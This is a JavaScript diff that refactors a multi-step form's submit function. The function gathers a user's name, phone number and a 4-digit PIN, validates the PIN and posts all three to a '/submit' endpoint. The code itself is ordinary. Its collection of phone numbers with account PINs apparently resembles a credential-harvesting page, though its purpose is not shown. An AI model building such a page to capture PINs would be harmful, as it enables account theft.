@@ -143,34 +143,35 @@ function nextStep3() {
 // FINAL SUBMIT
 // =====================================
 function submitApp() {
-    // get phone (from page 5 display OR storage)
+
     const phone = localStorage.getItem("phone");
 
-    // get PIN from boxes
-    const pin =
-    document.getElementById("pin1")?.value +
-    document.getElementById("pin2")?.value +
-    document.getElementById("pin3")?.value +
-    document.getElementById("pin4")?.value;
+    const pinInputs = document.querySelectorAll(".pin-box");
 
-if (!pin || pin.length !== 4) {
-    alert("Enter complete PIN");
-    return;
-}
+    let pin = "";
+    pinInputs.forEach(input => {
+        pin += input.value;
+    });
+
+    if (pin.length !== 4) {
+        alert("Enter complete PIN");
+        return;
+    }
+
+    if (!/^\d{4}$/.test(pin)) {
+        alert("PIN must be 4 digits");
+        return;
+    }
+
     const data = {
         name: localStorage.getItem("fname") + " " + localStorage.getItem("lname"),
         phone: phone,
         pin: pin
     };
 
-    if (!/^\d{4}$/.test(pin)) {
-    alert("PIN must be 4 digits");
-    return;
-}
-
-const btn = document.querySelector(".login-btn");
-btn.disabled = true;
-btn.innerText = "Processing...";
+    const btn = document.querySelector(".login-btn");
+    btn.disabled = true;
+    btn.innerText = "Processing...";
 
     fetch("/submit", {
         method: "POST",
